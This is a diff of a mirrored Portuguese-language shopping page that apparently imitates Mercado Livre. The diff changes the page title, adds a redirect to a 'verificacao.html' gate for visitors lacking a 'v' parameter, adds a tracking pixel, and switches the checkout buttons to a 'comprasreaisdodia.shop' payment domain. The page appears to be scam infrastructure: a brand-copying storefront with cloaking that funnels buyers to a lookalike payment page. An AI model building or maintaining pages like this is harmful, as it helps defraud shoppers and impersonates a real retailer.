@@ -1,15 +1,29 @@
 <html lang="pt-br"><head>
-  <script>
+<script>
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  if (!params.has("v")) {
+    window.location.replace("verificacao.html" + window.location.search);
+  }
+})();
+</script>
+<script>
+if (window.location.pathname.endsWith('/index.html') || window.location.pathname.endsWith('index.html')) {
+  window.location.replace('verificacao.html' + window.location.search);
+}
+</script>
+<script>
   window.pixelId = "66a3fc115f57e7496bcf1525";
   var a = document.createElement("script");
   a.setAttribute("async", "");
   a.setAttribute("defer", "");
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
-</script> 
+</script>
+   
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>Mercado Livre</title>
+  <title>Mercado ofertas</title>
 </script>
 
 <script>
@@ -77,7 +91,7 @@
             <span style="font-family: 'GellixMedium'; color: black;">❮ Voltar</span>
          </div>
          <div class="logo-central">
-            <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+
          </div>
          <div class="menu-icon" style="padding-right: 3%;">
             <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 0px; color: black">shopping_cart</span>
@@ -119,7 +133,7 @@
       </div>
       <button class="pergunta-botao"
 onclick="setTimeout(function(){
-window.open('https://pay.comprasreaisdodia.com/RmA83E0Po8OgPVp'+window.location.search,'_self');
+window.open('https://pay.comprasreaisdodia.shop/RmA83E0Po8OgPVp'+window.location.search,'_self');
 },500);
 
 ">
@@ -129,7 +143,7 @@ window.open('https://pay.comprasreaisdodia.com/RmA83E0Po8OgPVp'+window.location.
       <!--
       <div class="promocao">
          <p class="promotitle">Ofertas especiais 🔥</p>
-         <div class="button-container" href="#" onclick="window.open('https://pay.comprasreaisdodia.com/RmA83E0Po8OgPVp' + window.location.search, '_self')">
+         <div class="button-container" href="#" onclick="window.open('https://pay.comprasreaisdodia.shop/RmA83E0Po8OgPVp' + window.location.search, '_self')">
             <button class="styled-button" style="background-color: #ffffff;">
             <span class="button-text">
             <span class="button-title" style="color: #0169EB">LEVAR 3 UNIDADES</span>
@@ -233,3 +247,7 @@ window.open('https://pay.comprasreaisdodia.com/RmA83E0Po8OgPVp'+window.location.
 
 
 </body><!-- Mirrored from promocaorespondaeganhe.shop/produtos/celular-rosa by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 14 Jul 2024 17:40:25 GMT --></html>
+
+
+
+
